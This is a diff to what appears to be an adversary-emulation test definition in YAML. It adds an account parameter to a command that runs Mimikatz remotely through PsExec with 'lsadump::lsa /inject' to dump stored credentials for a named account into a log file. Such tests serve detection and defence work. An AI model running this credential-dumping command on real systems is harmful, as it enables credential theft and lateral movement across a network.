@@ -15,6 +15,10 @@ atomic_tests:
       description: psexec windows executable
       type: Path
       default: C:\\Users\\PlayerOne\\Documents\\Mimikatz\\x64\\PsExec.exe
+    account:
+      description: Account to impersonate
+      type: string
+      default: Attacker1
     machine:
       description: machine to target
       type: string
@@ -25,6 +29,6 @@ atomic_tests:
       default: C:\\Users\\PlayerOne\\Documents\\Mimikatz\\x64\\mimikatz.log
   executor:
     command: |
-      #{psexec_path} /accepteula \\#{machine} -c #{mimikatz_path} "lsadump::lsa /inject" "exit" > #{output_file}
+      #{psexec_path} /accepteula \\#{machine} -c #{mimikatz_path} "lsadump::lsa /inject /name:#{account}" "exit" > #{output_file}
     name: powershell
     elevation_required: true
